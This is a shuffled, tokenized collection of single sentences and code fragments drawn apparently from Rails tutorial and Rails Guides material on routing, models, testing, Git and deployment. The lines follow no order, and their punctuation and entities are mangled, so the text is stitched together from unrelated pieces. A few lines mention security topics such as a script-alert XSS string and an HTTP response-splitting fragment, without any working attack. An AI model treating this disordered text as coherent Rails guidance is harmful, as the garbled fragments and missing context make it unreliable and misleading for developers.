1 ▖ ordinalize # = &gt; &quot; 1st &quot;
A custom Help page .
With our tests in place , we &apos;re ready to start developing the signin form .
from Listing ~ \ ref { code : gitignore } to
This line tells Rails which attributes of the model are \ emph { accessible } , i ▖ e ▖ , which attributes can be modified automatically by outside users ( such as users submitting requests with web browsers ) .
This returned &quot; some &amp; lt ; script &amp; gt ; alert ( &apos; hello &apos; ) &amp; lt ; / script &amp; gt ; &quot; , which makes an attack work ▖
Ruby ignores comments , but they are useful for human readers ( including , often , the original author ! ) .
Putting a copy of your Git repository at GitHub serves two purposes : it &apos;s a full backup of your code ( including the full history of commits ) , and it makes any future collaboration much easier .
With the `as` option we can specify a different name for the local variable ▖
may yield
An incoming path of ` / photos / show / 1 / 2` will be dispatched to the `show` action of the `PhotosController` ▖
Deferral or elimination of more complex configuration options ( Spork , RubyTest )
Because following and unfollowing involve creating and destroying relationships , we need a Relationships controller , which we generate as usual
person ▖ errors ▖ empty ?
Test for the \ kode { followed \ _ users } and \ kode { followers } pages .
If you want , you can even inspect the browser cookies to see the result directly ( Figure ~ \ ref { fig : cookie _ in _ browser } )
Given
at least one word character , plus , hyphen , or dot
This means that if all we care about is that the number of microposts appears \ emph { somewhere } on the page , we can look for a match as follows :
$ bin / rails generate scaffold user name email login
as shown in Listing ~ \ ref { code : correct _ user _ before _ filter } .
Creates a file upload field .
* `config ▖ action _ dispatch ▖ http _ auth _ salt` sets the HTTP Auth salt value ▖
Used internally by `javascript _ include _ tag` to build the script path .
ensures that the anchor tag ~ \ kode { a } has the right \ kode { href } ( URL ) attribute---in this case , a link to the user &apos;s profile page .
Section ~ \ ref { sec : destroying _ users } adds user deletion to the sample app , taking care to restrict its use to a special class of administrative users .
The render command is the same one used ╼ inside of Action Controller , so you can use all the same options , such as ╼ ` : text` , ` : inline` etc .
Routes inside an engine are drawn on the `Engine` class within ╼ `config / routes ▖ rb` , like this :
When following REST principles , resources are typically referenced using the resource name and a unique identifier .
has _ many : paragraphs , through : : sections
Defining assignment to \ kode { current \ _ user } .
# You can have the root of your site routed with &quot; root &quot;
Implement a feature to send each user an email notification when they gain a new follower .
As in the console session above , the failed save in Listing ~ \ ref { code : first _ create _ action } generates a list of error messages associated with the \ kode { @ user } object .
This is currently my preferred setup , as it works great when you only have a few tests while still scaling nicely even to very large ( and therefore long-running ) test suites .
Calls to `respond _ with` and `respond _ to` ( again , at the class level ) will no longer work without having included the `responders` gem in your dependencies :
The fingerprinting behavior is controlled by the `config ▖ assets ▖ digest` ╼ initialization option ( which defaults to `true` for production and `false` for ╼ everything else ) .
Most useful for unit and functional testing .
Produce a string representation of a number rounded to a precision :
&#124; Option &#124; I18n key &#124;
Read more : https : / / github ▖ com / rails / jbuilder
Revisiting the above case , we could rewrite `Client ▖ limit ( 10 ) ` to use eager load addresses :
Because we won &apos;t need fixtures until Chapter ~ \ ref { cha : basic _ login } , for now we &apos;ll just remove them , leaving an empty fixtures file ( Listing ~ \ ref { code : empty _ fixtures } ) .
As a result , our implementation will parallel aspects of \ kode { has \ _ secure \ _ password } .
To complete a working signup form , we need to fill in the commented-out section in Listing ~ \ ref { code : first _ create _ action } with the appropriate behavior .
The `prefix` change makes Sprockets use a different URL for serving assets in ╼ development mode , and pass all requests to Sprockets ▖
# and use secure cookies .
Sometimes minor version differences will yield identical results , but you shouldn &apos;t count on this , especially with respect to Rails versions .
# This code is not idiomatically correct .
* `decrement !
You might have cloned your forked repository into your machine and might want to add the original Rails repository as a remote instead , if that &apos;s the case here &apos;s what you have to do .
When the time comes , Google ``install configure postgresql &lt; your system &gt; &apos; &apos; and ``rails postgresql setup &apos; &apos; and prepare for a challenge .
Note that being unreachable does not imply being anonymous :
Ordering the microposts with \ kode { default \ _ scope } ▖
In this case , we use \ kode { find \ _ by } instead of \ kode { find } because the latter raises an exception when the micropost doesn &apos;t exist instead of returning \ kode { nil } .
The new About page ( \ href { http : / / localhost : 3000 / static _ pages / about } { / static \ _ pages / about } ) .
# # # Coding Links to Assets
These are completely unrelated to Ruby classes .
# executed in the module &apos;s context ( blorgh / concerns / models / article ) .
Extensions to `String`
class Transformer
Enabling SSL is as easy as uncommenting a single line in \ kode { production ▖ rb } , the configuration file for production applications .
If the object is not duplicable , `deep _ dup` will just return it :
╼ $ bundle exec rake db : rollback
def determine _ default _ mailer ( name )
&#124; `sendmail _ settings` &#124; Allows you to override options for the ` : sendmail` delivery method .
The sample application Home page with debug information .
create ▖ gitignore
You specify a request-based constraint the same way that you specify a segment constraint :
In the case of in-place transformations like `gsub ! ` the receiver itself becomes unsafe .
Active Support has been carefully revised so that cherry-picking a file loads only strictly needed dependencies , if any .
format ▖ json { render json : @ user , status : : created , location : @ user }
When a user \ emph { un } follows another user , what is being destroyed ?
wouldn &apos;t actually test anything because \ kode { microposts } would be empty .
You may have noticed that the \ kode { rails new } command already created a layout file .
&lt; strong &gt; Title : &lt; / strong &gt;
database : my _ database
To implement the data model in Figure ~ \ ref { fig : user _ model _ password _ digest } , we first generate an appropriate migration for the \ kode { password \ _ digest } column .
orders ▖ create ( attributes = { } )
Note the use of the compact multiple assignment
actually worked , but it was insecure by default and required a careful and error-prone procedure to prevent malicious users from potentially modifying the application database .
&#124; PATCH / PUT &#124; / photos / : id &#124; photos # update &#124; update a specific photo &#124;
The default is &quot; utf-8 &quot; .
Adding account activation code to the User model ▖
Weird , right ? I don &apos;t get it either .
In Section ~ \ ref { sec : remember _ me _ checkbox } , we &apos;ll enable a common alternative model , a ``remember me &apos; &apos; checkbox that allows users to opt out of being remembered .
&#124; &#124; 423 &#124; : locked &#124;
Examining Listing ~ \ ref { code : demo _ application _ controller _ class } , we see that \ kode { ApplicationController } itself inherits from \ kode { ActionController : : Base } ; this is the base class for controllers provided by the Rails library Action Pack .
NOTE : Defined in `active _ support / core _ ext / string / filters ▖ rb` .
end
To handle this possibility , we &apos;ll use the same \ kode { find \ _ by } method used to find by email address in the \ kode { create } method , with \ kode { id } in place of \ kode { email } :
The difference is that `find _ in _ batches` yields _ batches _ to the block as an array of models , instead of individually ▖
Now , the form will be submitted by Ajax rather ╼ than by the browser &apos;s normal submit mechanism .
By extension , the term \ emph { avatar } is commonly used to mean some kind of personal representation , especially in a virtual environment .
After submitting invalid signin data , this test follows the Home link in the site layout and then requires that the flash error message not appear .
They initialize a class variable to `nil` unless it already exists , and generate the corresponding class methods to access it :
Order ▖ select ( &quot; date ( created _ at ) as ordered _ date , sum ( price ) as total _ price &quot; ) .
Sprockets assumes you are requiring a ` ▖ js` file when done from within a ` ▖ js` ╼ file .
( As with the first app , take care \ emph { not } to initialize the GitHub repository with a \ kode { README } file ▖ )
NOTE : It is * * highly * * recommended that the `isolate _ namespace` line be left ╼ within the `Engine` class definition ▖
This behavior is appropriate on the user profile page because it will only happen if the id is invalid , but in the present case \ kode { session &#91; : user \ _ id &#93; } will often be \ kode { nil } ( i ▖ e ▖ , for non-logged-in users ) .
The main difference between classes and ids is that classes can be used multiple times on a page , but ids can be used only once .
Following the table schema above , you would be able to write code like the ╼ following :
$ git apply ~ / my _ changes ▖ patch
Builder templates are a more programmatic alternative to ERB ▖
The rest of the steps proceed similarly .
╼ = &gt; &quot; development &quot;
# 1 ▖ even ?
for item in @ recent _ items
For this ╼ reason , the engine should not hardcode associations specifically for a `User` ╼ class .
It &apos;s worth noting that using Bootstrap automatically makes our application &apos;s design \ href { http : / / en ▖ wikipedia ▖ org / wiki / Responsive _ web _ design } { \ emph { responsive } } , ensuring that it looks sensible across a wide range of devices .
# # # # # `select`
user ▖ name = &apos; Dave&apos;
A summary of the default Rails directory structure .
( \ emph { Hint : } What if a user is following 5000 other users ? )
Including the Application helper in tests .
1,2 &#93; ) # = &gt; true
$ git checkout my _ pull _ request
vendor / assets / somepackage / phonebox ▖ js
If you wish to override the default delivery options ( e ▖ g ▖ SMTP credentials ) ╼ while delivering emails , you can do this using `delivery _ method _ options` in the ╼ mailer action .
If you &apos;re worried that \ kode { find \ _ by } will be inefficient if there are a large number of users , you &apos;re ahead of the game ; we &apos;ll cover this issue , and its solution via database indices , in Section ~ \ ref { sec : uniqueness _ validation } .
$ git rebase rails / branch _ name
There &apos;s an important difference , though ; Ruby won &apos;t interpolate into \ linebreak single-quoted strings :
Here is an attack vector in UTF-8 encoding :
config ▖ generators do &#124; g &#124;
Though it shouldn &apos;t matter for the example applications in the \ emph { Rails Tutorial } , if you &apos;re worried about accidentally making your app public too soon there are several options ; see Section ~ \ ref { sec : heroku _ commands } for one .
calls the \ kode { stylesheet \ _ link \ _ tag } function with two arguments : a string , indicating the path to the stylesheet , and a hash with two elements , indicating the media type and telling Rails to use the \ href { https : / / github ▖ com / rails / turbolinks } { turbolinks } feature ( new in Rails ~ 4 ) .
Applying this rule change to the remaining static page routes from Listing ~ \ ref { code : contact _ route } gives Listing ~ \ ref { code : static _ page _ routes } .
user ▖ occupation = &quot; Code Artist &quot;
We originally used instance variables both because instance variables are important to introduce early and because \ kode { let } is a little more advanced .
In this section we &apos;ll make use of the latest features of RSpec to make our tests more compact and elegant .
Just change it from its default &quot; localhost &quot; setting .
* Rails 3 ▖ 2 ▖ x is the last branch to support Ruby 1 ▖ 8 ▖ 7 .
Section ~ \ ref { sec : email _ in _ production } discusses how to send email for real in a production environment .
$ git checkout my _ new _ branch
&#91; 1 , 2 , 3 &#93; ▖ in _ groups _ of ( 2 , false ) # = &gt; &#91; &#91; 1 , 2 &#93; , &#91; 3 &#93; &#93;
Along the way , we &apos;ll get our first taste of \ emph { automated testing } , which will help us be more confident that our code is correct .
# # # Compacting
Instead , we &apos;ll use a cloud storage service to store images separately from our application
The tests specify that the original user should not have access to the wrong user &apos;s \ kode { edit } or \ kode { update } actions .
Our test for validity will look like this :
Array ▖ wrap ( nil ) # = &gt; &#91; &#93;
&#124; * * Client Error * * &#124; 400 &#124; : bad _ request &#124;
$ ( &quot; &lt; % = escape _ javascript ( render @ user ) % &gt; &quot; ) ▖ appendTo ( &quot; # users &quot; ) ;
&#124; &#124; 501 &#124; : not _ implemented &#124;
╼ ╼ \ section { Sample app setup } % ( fold ) ╼ \ label { sec : sample _ app _ setup } ╼ ╼ As in Chapter ~ \ ref { cha : a _ toy _ app } , before getting started we need to
The third is updating the various environment files with the correct default ╼ options .
But what if we don &apos;t provide a title ?
Inside the `show` action of `UsersController` , `params &#91; : username &#93; ` will contain the username for the user ▖
When this ╼ option is not used , Active Record will use the respective default error message ╼ for each validation helper .
attachments &#91; &apos; filename ▖ jpg &apos; &#93; = {
doc /
Post valid information to the sessions path .
assembly _ ids
You &apos;ll see the ╼ &quot; Hello , Rails ! &quot; message you put into `app / views / welcome / index ▖ html ▖ erb` , ╼ indicating that this new route is indeed going to `WelcomeController` &apos; s `index` ╼ action and is rendering the view correctly .
This will render a book with `special ? ` set with the `special _ show` template , while other books will render with the default `show` template .
At this point , the Alice scenario above will work fine : the database will save a user record based on the first request , and it will reject the second save for violating the uniqueness constraint .
Founder , CD Baby
Rake is \ emph { Ruby make } , a make-like language written in Ruby .
* Rails 4 ▖ 0 deprecated `ActionController : : Integration` in favor of `ActionDispatch : : Integration` .
&#124; GET &#124; / magazines / : magazine _ id / ads / new &#124; ads # new &#124; return an HTML form for creating a new ad belonging to a specific magazine &#124;
( In Chapter ~ \ ref { cha : following _ users } , we &apos;ll generalize this feed to include the microposts of users being \ emph { followed } by the current user ▖ )
Active Job ╼ is integrated with Action Mailer so you can easily send emails asynchronously :
Rails takes a number ╼ of internal steps to mitigate common causes of these problems that can be ╼ automatically detected and corrected ▖
Unfortunately , lots of things can go wrong along the way .
&lt; h2 &gt; &lt; % = article ▖ title % &gt; &lt; / h2 &gt;
but if we computed them the other way around , the result would be different :
( I didn &apos;t follow his exact advice , though , so if it &apos;s still confusing he bears none of the blame ▖ )
Or you can use other HTTP headers to convey other information :
delegate : name , : age , : address , : twitter , to : : profile
Unlike the \ kode { -d } flag , the \ kode { -D } flag will delete the branch even though we haven &apos;t merged in the changes .
One of the most notable additions in recent versions of Rails is the \ emph { asset pipeline } , which significantly improves the production and management of static assets such as CSS , JavaScript , and images .
The main difference is the use of \ kode { update \ _ attribute } in the latter case .
With web page defacement an attacker can do a lot of things , for example , present false information or lure the victim on the attackers web site to steal the cookie , login credentials or other sensitive data ▖
scope : active , - &gt; { where active : true }
* &#91; Ruby on Rack # 1 - Hello Rack ! &#93; (
Because we &apos;ll need forms both for creating new password resets ( Figure ~ \ ref { fig : forgot _ password _ form _ mockup } ) and for updating them by changing the password in the User model ( Figure ~ \ ref { fig : reset _ password _ form _ mockup } ) , we need routes for \ kode { new } , \ kode { create } , \ kode { edit } , and \ kode { update } .
Although our authentication system is now working , newly registered users might be confused , as they are not logged in by default .
There are quite a few steps , but they are mostly straightforward ; see if you can follow along in Listing ~ \ ref { code : signup _ with _ account _ activation _ test } .
You don &apos;t ordinarily include comments in console sessions , but for instructional purposes I &apos;ll include some comments in what follows , like this :
# Converts a collection of elements into a formatted string by
We &apos;ll render the error as a flash message , which we can test for as follows :
At this point , the presence validations are complete , and the test suite should be \ passing :
* `config ▖ action _ controller ▖ default _ static _ extension` configures the extension used for cached pages ▖
Returns a `pre` tag that has object dumped by YAML ▖ This creates a very readable way to inspect an object .
# = &gt; ( 123 ) 555-1234 x 555
A mockup of our best guess at the final profile page .
The rest of the tutorial focuses on developing a single large \ emph { real sample application } ( called \ kode { sample \ _ app } ) , writing all the code from scratch .
Notice here how clever \ kode { paginate } is---it even works through the microposts association , reaching into the \ texttt { microposts } table and pulling out the desired page of microposts .
For any other value of `count` the plural form will be returned :
&lt; % @ people ▖ each do &#124; person &#124; % &gt;
MultiJSON has reached its &#91; end-of-life &#93; ( https : / / github ▖ com / rails / rails / pull / 10576 ) ╼ and has been removed from Rails .
class Array
module MyApplication
parts _ order : &#91; &quot; text / plain &quot; , &quot; text / enriched &quot; , &quot; text / html &quot; &#93;
However , the contents can be viewed by end users , and encrypting the contents eliminates this caveat / concern without a significant performance penalty .
So , it is in general not equivalent to what Ruby would do in the same spot , had a real constant be evaluated .
m ▖ anonymous ?
You can do this in your rails application by setting
In our case , we didn &apos;t already have a client named Andy so the record is created and returned .
Dir ▖ glob ( Rails ▖ root + &quot; app / decorators / * * / * _ decorator * ▖ rb &quot; ) ▖ each do &#124; c &#124;
NOTE : Defined in `active _ support / core _ ext / string / output _ safety ▖ rb` .
A mockup of signin failure ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signin _ failure _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Examining Listing ~ \ ref { code : toy _ application _ controller _ class } , we see that \ kode { ApplicationController } itself inherits from \ kode { ActionController : : Base } ; this is the base class for controllers provided by the Rails library Action Pack .
mount Blorgh : : Engine , at : &quot; / blog &quot;
Rails comes with three standard environments : \ kode { development } , \ kode { test } , and \ kode { production } .
Integration tests can verify correct routes , database updates , and proper changes to the layout .
Because of the \ kode { ▖ rdoc } extension on the file , GitHub ensures that it is formatted nicely , but the contents aren &apos;t helpful at all , so in this section we &apos;ll make our first edit by changing the \ kode { README } to describe our project rather than the Rails framework itself .
login _ procedure ▖ call ( token , options )
Then we &apos;ll check for a nonempty flash message and a successful redirect to the profile page , while also verifying that the user &apos;s information correctly changed in the database .
Consider these actions to see the difference :
Resulting HTML files can be found in the ▖ / doc / rdoc directory .
Finally , as with users , we &apos;ll make it possible to destroy microposts through the web .
&gt; &gt; x * = 3
Tests act as a \ emph { client } for the application code , thereby helping determine its design and its interface with other parts of the system .
Place the token in the browser cookies with an expiration date far in the future .
To test the micropost display on the profile , we need to associate the fixture microposts with a user .
In the end , he got a 4 KB worm , which he injected into his profile page .
For example , we could implement user signin by placing a cookie with value equal to the remember token that expires 20 ~ years from now :
Because we want the user id to be paired with the permanent remember token , we should make it permanent as well , which we can do by chaining the \ kode { signed } and \ kode { permanent } methods :
What follows builds on the work from Section ~ \ ref { sec : microposts _ resource } ; as with the model in that section , our new Micropost model will include data validations and an association with the User model .
attributes = { } )
Active Record does not accept unknown options when building associations , for example ▖
Client ▖ limit ( 5 )
There isn &apos;t much to this file - but note that the `Article` class inherits from ╼ `ActiveRecord : : Base` ▖
# # # # # `prev _ quarter` , `next _ quarter`
&lt; script src = &quot; http : / / html5shim ▖ googlecode ▖ com / svn / trunk / html5 ▖ js &quot; &gt; &lt; / script &gt;
* `config ▖ active _ record ▖ cache _ timestamp _ format` controls the format of the timestamp value in the cache key ▖
Third-party assets such as cascading style sheets ( CSS ) , JavaScript files , and images
The \ emph { Ruby on Rails Tutorial } takes an integrated approach to web development by building three example applications of increasing sophistication , starting with a minimal \ emph { hello } app ( Section ~ \ ref { sec : the _ hello _ application } ) , a slightly more capable \ emph { toy } app ( Chapter ~ \ ref { cha : a _ toy _ app } ) , and a real \ emph { sample } app ( Chapter ~ \ ref { cha : static _ pages } through Chapter ~ \ ref { cha : following _ users } ) .
mattr _ accessor : constant _ watch _ stack
TIP : Rendering pure text is most useful when you &apos;re responding to Ajax or web ╼ service requests that are expecting something other than proper HTML .
If order matters , use an array .
Apart from the address of the Heroku app , the result should be the same as in Figure ~ \ ref { fig : heroku _ app } .
# # # # Squashing commits
The users index page with 100 sample users .
The view for the Help page with an embedded Ruby title ▖
From the application root , run the model generator ▖
This is the text that will be returned to the browser .
in Listing ~ \ ref { code : user _ model _ activation _ code } and
Here the string \ kode { 9308b8f92fea4c19a3a0d8385b494526 } ( which will differ on your system ) is added by Rails to ensure that the filename is unique , which causes browsers to load images properly when they have been updated ( instead of retrieving them from the browser cache ) .
# # # # stylesheet _ path
ActionView : : Base ▖ sanitized _ allowed _ tags ▖ delete &apos; div&apos;
s ▖ add _ development _ dependency &quot; moo &quot;
has _ one : account , foreign _ key : &quot; supp _ id &quot;
So depending on your current request load , you could very well have multiple threads contending for a limited amount of connections .
&#124; &#124; 302 &#124; : found &#124;
Now that our sample users have both followed users and followers , we need to update the profile page and Home page to reflect this .
rake db : migrate SCOPE = blorgh VERSION = 0
The inheritance hierarchy for the \ kode { String } class .
FileETag None
belongs _ to : customer , - &gt; { where active : true } ,
* Prefer `method { do _ stuff } ` instead of `method { do _ stuff } ` for single-line blocks .
Submitting the \ href { http : / / localhost : 3000 / sessions / new } { / sessions / new } form then yields the result shown in Figure ~ \ ref { fig : initial _ failed _ login _ rails _ 3 } .
Scopes are also chainable within scopes :
When you try to save your object , `valid ? ` ╼ will be called upon each one of the associated objects .
Validations are covered in detail in &#91; Active ╼ Record Validations &#93; ( active _ record _ validations ▖ html )
@ person ▖ errors &#91; : base &#93; &lt; &lt; &quot; This person is evil &quot;
$ &lt; editor name &gt; .
Author ▖ where ( name : &apos; Hank Moody &apos; ) ▖ compact !
format ▖ json { render json : @ user ▖ errors , status : : unprocessable _ entity }
A working signup page on the live Web ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signup _ in _ production _ bootstrap-full ▖ png } { ( full size ) }
# Generates a datetime select that defaults to the datetime provided ( four days after today )
The view for the Help page with an Embedded Ruby title .
The method `prev _ week` is analogous :
assemblies &lt; &lt; ( object , ▖ ▖ ▖ )
For example , if a supplier has an account , but the actual name of the model containing accounts is `Billing` , you &apos;d set things up this way :
images javascripts stylesheets
`params &#91; : id &#93; ` will be ` &quot; 1 &quot; ` , and `params &#91; : user _ id &#93; ` will be ` &quot; 2 &quot; ` .
For a convenient way to visualize Git repositories , take a look at \ href { http : / / www ▖ sourcetreeapp ▖ com / } { Atlassian &apos;s SourceTree app } .
article GET / articles / : id ( ▖ : format ) articles # show
Over the years , hundreds of people have contributed to Ruby on Rails ranging from a single character to massive architectural changes or significant documentation - all with the goal of making Ruby on Rails better for everyone ▖
Once you see the general shape of the solution , you can then use TDD to implement a more polished version .
A boolean attribute \ kode { admin } on users automatically gives a \ kode { user ▖ admin ? } \ boolean method .
Active Support Core Extensions
# &lt; sha1 &gt; 723a47bfb3708f968821bc969a9a3fc873a3ed58 &lt; / sha1 &gt;
With the code as in Listing ~ \ ref { code : password _ resets _ integration _ test } , our test suite should be \ passing :
You can verify this yourself by running the test suite , which should pass :
As a first step in this process , this section contains some suggestions for further learning .
Recalling that \ kode { authenticate } returns \ kode { false } for an invalid authentication , our strategy for user signin can be summarized as follows :
in the arguments to \ kode { form \ _ for } , which is necessary for file uploads .
This will occur naturally in an integration test ( Listing ~ \ ref { code : password _ reset _ integration _ test } ) , but in the present context we need to create one by hand .
&lt; % = f ▖ submit % &gt;
We &apos;ll learn how to model such user relationships , and see the implications for the microposts feed , in Chapter ~ \ ref { cha : following _ users } .
A user with updated information ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / demo _ update _ user _ rails _ 3-full ▖ png } { ( full size ) }
To get the follow and unfollow buttons to work , all we need to do is find the user associated with the \ kode { followed \ _ id } in the corresponding form ( i ▖ e ▖ , Listing ~ \ ref { code : follow _ form } or Listing ~ \ ref { code : unfollow _ form } ) , and then use the appropriate \ kode { follow } or \ kode { unfollow } method from Listing ~ \ ref { code : follow _ unfollow _ following } .
In the following example , `find _ each` will retrieve 1000 records ( the current default for both `find _ each` and `find _ in _ batches` ) and then yield each record individually to the block as a model ▖
$ curl -i 127 ▖ 0 ▖ 0 ▖ 1 : 3000 / books
redirect _ to action : : index
To get a better picture of how Rails handles the submission , let &apos;s take a closer look at the \ kode { user } part of the parameters hash from the debug information ( Figure ~ \ ref { fig : signup _ failure _ rails _ debug } ) :
if expiration _ date ▖ present ?
params ▖ require ( : comment ) ▖ permit ( : text )
The result appears in Listing ~ \ ref { code : user _ edit _ specs }
The \ kode { User } class , highlighting inheritance .
and omit the leading \ kode { bundle exec } .
In Rails version 3 ▖ 0 and earlier , static assets lived in the \ kode { public / } directory , as follows :
# # # Showing Articles
/ tmp
# # # Reachable
# # # # `instance _ values`
This JavaScript code will simply display an alert box ▖
This is exactly the sort of feature that could easily lead to a spurious passing test ( i ▖ e ▖ , a test that would pass even if the application code were wrong ) , so we &apos;ll proceed using test-driven development to be sure we &apos;re testing the right thing .
For example , if each supplier in your application has only one account , you &apos;d declare the supplier model like this :
Listing ~ \ ref { code : generate _ user _ model } also created the model itself .
Unfortunately , this doesn &apos;t work , due to a subtlety about Ruby arrays .
Test for signin success .
duplicate # = &gt; &#91; &apos; foo &apos; &#93;
in Listing ~ \ ref { code : preventing _ unactivated _ logins } .
After invoking the model , the controller then renders the view and returns the complete web page to the browser as HTML .
n addition to
&lt; % = stylesheet _ link _ tag &quot; main &quot; , &quot; photos / columns &quot; % &gt;
$ bundle exec rake test ╼ $ git add -A ╼ $ git commit -m &quot; Add password resets &amp; email configuration &quot; ╼ $ git checkout master ╼ $ git merge account-activation-password-reset
WARNING ▖ Note that `reverse _ update` has no bang .
Tests for creating microposts .
The way to learn how to do something like this is by \ href { http : / / lmgtfy ▖ com / ? q = ruby + rails + escape + url } { Googling ``ruby rails escape url &apos; &apos; } .
* Rails 4 ▖ 0 has changed how errors attach with the `ActiveModel : : Validations : : ConfirmationValidator` ▖
To get this to work , we need to define the \ kode { password \ _ reset \ _ expired ? }
Now that we have a working User model , it &apos;s time to add an ability few websites can live without : letting users sign up for the site .
Form helpers are designed to make working with models much easier compared to using just standard HTML elements by providing a set of methods for creating forms based on your models ▖
config ▖ session _ store : my _ custom _ store
Signed-in users have no reason to access the \ kode { new } and \ kode { create } actions in the Users controller .
In particular , the master branch is insulated from any changes we make to the topic branch , so even if we \ emph { really } screw things up we can always abandon the changes by checking out the master branch and deleting the topic branch .
This will render a file named ` _ menu ▖ html ▖ erb` at that point within the view being rendered ▖
You can also push up to GitHub :
validates : registration _ number , length : { is : 6 }
`NOT` SQL queries can be built by `where ▖ not` .
We &apos;ve \ emph { almost } achieved that with our current layout , with one wrinkle : as you can see if you delete the \ kode { provide } call in one of the views , in the absence of a page-specific title the full title appears as follows :
This file path should be understood as being relative to the application &apos;s root directory , which will vary by system ; on the cloud IDE ( Section ~ \ ref { sec : development _ environment } ) , it looks like this :
Checking the file size with jQuery .
&lt; input name = &quot; commit &quot; type = &quot; submit &quot; value = &quot; Create &quot; / &gt;
* How to work with the error messages generated by the validation process .
Because the only gems we &apos;ve added are restricted to a production environment , right now this command doesn &apos;t actually install any additional local gems , but it &apos;s needed to update \ kode { Gemfile ▖ lock } with the \ texttt { pg } and \ texttt { rails \ _ 12factor } gems and the specific Ruby version .
render status : 500
Based on reader feedback , I &apos;m confident that you can still get a lot out of this book .
NOTE : Defined in `active _ support / core _ ext / string / strip ▖ rb` .
&lt; h1 &gt; Welcome to example ▖ com , &lt; % = @ user ▖ name % &gt; &lt; / h1 &gt;
( Many programmers rely on online documentation instead of the native ri and rdoc documents ▖ )
config ▖ action _ mailer ▖ default _ options = { from : &apos; no-reply @ example ▖ com &apos; }
In the present instance , we want to require the \ kode { params } hash to have a \ kode { : user } attribute , and we want to permit the name , email , password , and password confirmation attributes ( but no others ) .
Active Record validations allow us to place constraints on the data in our models .
You should not rely on any particular ╼ order among those ▖
= &gt; Rails application starting on http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000
The first Rails Tutorial application running on Heroku .
Then run these :
&lt; div &gt; &lt; input type = &quot; submit &quot; value = &quot; An article &quot; &gt; &lt; / div &gt;
* `load _ environment _ hook` Serves as a placeholder so that ` : load _ environment _ config` can be defined to run before it .
Temporarily commenting out failing tests ▖
Defaults to `false` and will use Test : : Unit by default .
This guide provides you with all you need to get started in creating , ╼ enqueueing and executing background jobs .
g the text ``The form contains 4 errors ▖ &apos; &apos; ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-faa5fa &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection testing _ unsuccessful _ edits ( end ) ╼ ╼ \ subsection { Successful edits ( with TDD ) } % ( fold ) ╼ \ label { sec : successful _ edits } ╼ ╼
It worked !
But be warned : they accomplish their amazing fifteen-minute feat using a feature called \ emph { scaffolding } , which relies heavily on \ emph { generated code } , magically created by the Rails \ kode { generate } command .
The result appears in Listing ~ \ ref { code : route _ tests }
* `config ▖ middleware` allows you to configure the application &apos;s middleware ▖
&lt; % cache do % &gt;
NOTE : Defined in `active _ support / core _ ext / module / introspection ▖ rb` .
* Method names .
is always \ kode { nil } .
* `application _ controller ▖ rb`
make _ microposts
Refactoring the code as above is incredibly more error-prone without a solid test suite , which is why we went to such trouble to write good tests in Section ~ \ ref { sec : login _ with _ remembering } and Section ~ \ ref { sec : remember _ tests } .
get &apos; / &apos; = &gt; &apos; root # index&apos;
╼ ╼ % = lang : rhtml ╼ \ begin { code }
Since we have already done one push ( Section ~ \ ref { sec : github } ) , on most systems we can omit \ kode { origin master } , and simply run \ kode { git push } :
* Model Class - Singular with the first letter of each word capitalized ( e ▖ g ▖ , ╼ `BookClub` ) .
In this case , though , the \ kode { xhr } method is ( somewhat inexplicably ) not available in integration tests .
\ emph { Note } : If you would like to install \ emph { all } the gems needed for the sample application , you should use the code in Listing ~ \ ref { code : final _ gemfile } at this time .
Keys are strings :
config ▖ active _ job ▖ queue _ name _ prefix = Rails ▖ env
&lt; tr &gt;
( Take care \ emph { not } to initialize the repository with a \ kode { README } file , as \ kode { rails new } creates one of those automatically ▖ )
You can also use the ╼ `require _ directory` directive which includes all JavaScript files only in the ╼ directory specified , without recursion .
╼ &gt; &gt; Rails ▖ env
HTTP / 1 ▖ 1 200 OK &#91; Second New response created by attacker begins &#93;
If you want to render the view that corresponds to a different template within the same controller , you can use `render` with the name of the view :
The ability to grab and automatically assign all ╼ controller parameters to your model in one shot makes the programmer &apos;s job ╼ easier , but this convenience also allows malicious use ▖
Because of the flash message display in the site layout ( Listing ~ \ ref { code : layout _ flash } ) , the \ kode { flash &#91; : danger &#93; } message automatically gets displayed ; because of the Bootstrap CSS , it automatically gets nice styling ( Figure ~ \ ref { fig : failed _ signin _ flash } ) .
The following methods skip validations , and will save the object to the ╼ database regardless of its validity ▖
Scaffolding : Quicker , easier , more seductive
A cookie consists of two pieces of information , a \ kode { value } and an optional \ kode { expires } date .
Full paths from the document root will be passed through ▖
The placement of the text isn &apos;t good and the logo doesn &apos;t have any style , but the colors and signup button look promising .
mime _ version : &quot; 1 ▖ 0 &quot; ,
To include multiple files such as `app / assets / javascripts / main ▖ js` and `app / assets / javascripts / columns ▖ js` at the same time :
Adding a Second Model
create db / migrate / &#91; timestamp &#93; _ create _ users ▖ rb
# # # # Deleting a Middleware
The method is to make three factory users ( signing in as the first one ) and then verify that the index page has a list element ( \ kode { li } ) tag for the name of each one .
get &apos; exit &apos; , to : &apos; sessions # destroy &apos; , as : : logout
In this case , the final fixture in the file is created last ( and hence is most recent ) , but it would be foolish to rely on this behavior , which is brittle and probably system-dependent .
In Listing ~ \ ref { code : example _ user } , we did this with Ruby &apos;s \ kode { attr \ _ accessor } method :
You can think of the \ emph { Ruby on Rails Tutorial } as a video game where you are the main character , and where you level up as a Rails developer in each chapter .
As noted in Section ~ \ ref { sec : format _ validation } , the email regex in Listing ~ \ ref { code : validates _ format _ of _ email } allows invalid email addresses with consecutive dots in the domain name , i ▖ e ▖ , addresses of the form \ emph { foo @ bar ▖ ▖ com } .
Git is a large subject , and we &apos;ll only be scratching the surface in this book , but there are many good free resources online ; I especially recommend \ href { https : / / confluence ▖ atlassian ▖ com / display / BITBUCKET / Clone + your + Git + repository + and + add + source + files } { Bitbucket 101 } for a short overview and \ href { http : / / git-scm ▖ com / book } { \ emph { Pro Git } } by Scott Chacon for a book-length introduction .
&quot; hello &quot; ▖ from ( 0 ) # = &gt; &quot; hello &quot;
# # # # `parameterize`
We &apos;ll start with some short tests .
Of course , we could just edit the migration file for the \ kode { users } table in Listing ~ \ ref { code : users _ migration } , but that would require rolling back and then migrating back up .
